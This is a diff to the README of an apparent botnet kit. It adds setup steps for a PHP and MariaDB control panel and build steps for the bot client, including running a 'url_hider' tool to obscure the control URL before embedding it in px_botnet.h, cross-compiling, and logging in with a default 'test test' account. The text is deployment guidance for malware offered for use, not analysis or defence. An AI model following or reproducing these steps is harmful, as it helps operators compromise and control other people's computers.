@@ -17,9 +17,21 @@
 ---
 ## Setup :
 
+Server :
+
+```
+
+(sudo) apt install apache2 php mariadb-server mariadb-client php php-cli php-fpm php-json php-pdo php-mysql php-zip php-gd  php-mbstring php-curl php-xml php-pear php-bcmath
+
+```
+
+Client :
+
+```
 (sudo) apt install gcc make
 
 cd BOT && make
+
 cd url_hider && ./url_hider "your url"
 
 Edit includes/px_botnet.h - stringifer with your url hided
@@ -29,9 +41,10 @@ make re
 
 If you want to cross compile custom Makefile at line 82 with a "." before "$(cross)" and use : "make everything"
 
+```
+
 ## Usage :
-Bot : make
-Website : (Upload db, configure config/config.php) Default user : test test
+Website : (Upload db, configure config/config.php) Default user/pass: test test
 
 ## Demo :
 ![image description](./images/demo.png)
